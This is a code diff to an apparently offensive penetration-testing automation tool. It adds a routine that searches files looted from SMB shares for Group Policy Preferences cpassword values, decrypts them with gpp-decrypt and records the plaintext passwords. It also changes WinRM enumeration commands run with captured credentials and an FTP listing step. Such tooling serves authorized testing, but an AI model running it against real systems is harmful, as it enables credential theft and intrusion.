@@ -1056,8 +1056,60 @@ def _smb_spider(
             findings.bullet(f"  `{rel}` ({f.stat().st_size} B)")
         findings.add_summary(f"SMB files downloaded for {user}: {len(files)} files in loot/creds_smb/{user}/")
         print(f"        [+] {len(files)} SMB files downloaded → loot/creds_smb/{user}/")
+        _parse_gpp_cpassword(files, findings, ws, available)
     else:
         print(f"        [-] No files downloaded from SMB")
+
+
+def _parse_gpp_cpassword(
+    files: list, findings: ServiceBuffer, ws: Workspace, available: set[str],
+) -> None:
+    """Scan downloaded SMB files for GPP cpassword entries and attempt decryption."""
+    import base64
+    from pathlib import Path
+
+    # Text-based GPP files: XML, inf — grep for cpassword=
+    cpassword_re = re.compile(r'cpassword="([^"]+)"', re.IGNORECASE)
+    # Registry.pol is binary — look for cpassword as a UTF-16LE string
+    binary_re = re.compile(rb'c\x00p\x00a\x00s\x00s\x00w\x00o\x00r\x00d\x00=\x00"((?:[^\x00"]\x00)*)"', re.IGNORECASE)
+
+    found_any = False
+    for f in files:
+        try:
+            if f.suffix.lower() in (".xml", ".inf", ".ini", ".pol", ".txt"):
+                # Try text first
+                try:
+                    text = f.read_text(errors="ignore")
+                    for m in cpassword_re.finditer(text):
+                        _handle_cpassword(m.group(1), str(f), findings, ws, available)
+                        found_any = True
+                except Exception:
+                    pass
+                # Also scan as binary for Registry.pol UTF-16LE encoding
+                raw = f.read_bytes()
+                for m in binary_re.finditer(raw):
+                    cp = m.group(1).decode("utf-16-le", errors="ignore").rstrip('"')
+                    if cp:
+                        _handle_cpassword(cp, str(f), findings, ws, available)
+                        found_any = True
+        except Exception:
+            pass
+
+    if not found_any:
+        findings.note("GPP scan: no cpassword entries found in downloaded files")
+
+
+def _handle_cpassword(cpassword: str, source: str, findings: ServiceBuffer, ws: Workspace, available: set[str]) -> None:
+    findings.bullet(f"**GPP cpassword found** in `{source}`: `{cpassword}`")
+    findings.add_summary(f"GPP cpassword in {source} — decrypt with gpp-decrypt")
+    if "gpp-decrypt" in available:
+        result = subprocess.run(["gpp-decrypt", cpassword], capture_output=True, text=True, timeout=10)
+        if result.returncode == 0 and result.stdout.strip():
+            plaintext = result.stdout.strip()
+            findings.bullet(f"  **Decrypted:** `{plaintext}`")
+            ws.add_cred(plaintext)
+            findings.add_summary(f"GPP plaintext password: {plaintext}")
+            print(f"        [+] GPP password decrypted: {plaintext}")
 
 
 def _creds_smb(
@@ -1095,15 +1147,15 @@ def _creds_winrm(
         findings.add_summary(f"WinRM access: `{user}` on port {port}")
         print(f"        [+] {user}: WinRM:{port} valid")
         win_cmds = [
-            ("whoami /all",                                                                      f"creds_winrm_whoami_all_{user}"),
-            ("net localgroup administrators",                                                    f"creds_winrm_localadmins_{user}"),
-            ('net group "Domain Admins" /domain',                                               f"creds_winrm_domainadmins_{user}"),
-            ("ipconfig /all",                                                                    f"creds_winrm_ipconfig_{user}"),
-            ('systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Domain"', f"creds_winrm_sysinfo_{user}"),
+            ("whoami /all",                                                                                      f"creds_winrm_whoami_all_{user}"),
+            ("net localgroup administrators",                                                                    f"creds_winrm_localadmins_{user}"),
+            ('net group "Domain Admins" /domain',                                                               f"creds_winrm_domainadmins_{user}"),
+            ("ipconfig /all",                                                                                    f"creds_winrm_ipconfig_{user}"),
+            ("Get-ComputerInfo | Select-Object CsName,OsName,OsVersion,CsDomainRole | Format-List",             f"creds_winrm_sysinfo_{user}"),
         ]
         for win_cmd, label in win_cmds:
-            cmd2 = ["nxc", "winrm", ip, "-u", user, "-p", pw, "-x", win_cmd]
-            findings.cmd(f"nxc winrm {ip} -u {user} -p *** -x \"{win_cmd}\"")
+            cmd2 = ["nxc", "winrm", ip, "-u", user, "-p", pw, "-X", win_cmd]
+            findings.cmd(f"nxc winrm {ip} -u {user} -p *** -X \"{win_cmd}\"")
             out2 = runner.run(cmd2, label, timeout=30)
             findings.code_block(_trim(out2))
     else:
@@ -1148,11 +1200,11 @@ def _creds_ftp(
     runner: Runner, findings: ServiceBuffer, ws: Workspace,
 ) -> None:
     findings.h4(f"FTP — {user}")
-    findings.cmd(f"curl -sk ftp://{ip}:{port}/ --user {user}:*** -l")
+    findings.cmd(f"curl -sk ftp://{ip}:{port}/ --user {user}:*** --ftp-pasv -l")
     try:
         result = subprocess.run(
             ["curl", "-sk", f"ftp://{ip}:{port}/", "--user", f"{user}:{pw}",
-             "--connect-timeout", "10", "-l"],
+             "--ftp-pasv", "--connect-timeout", "10", "-l"],
             capture_output=True, text=True, timeout=15,
         )
     except subprocess.TimeoutExpired:
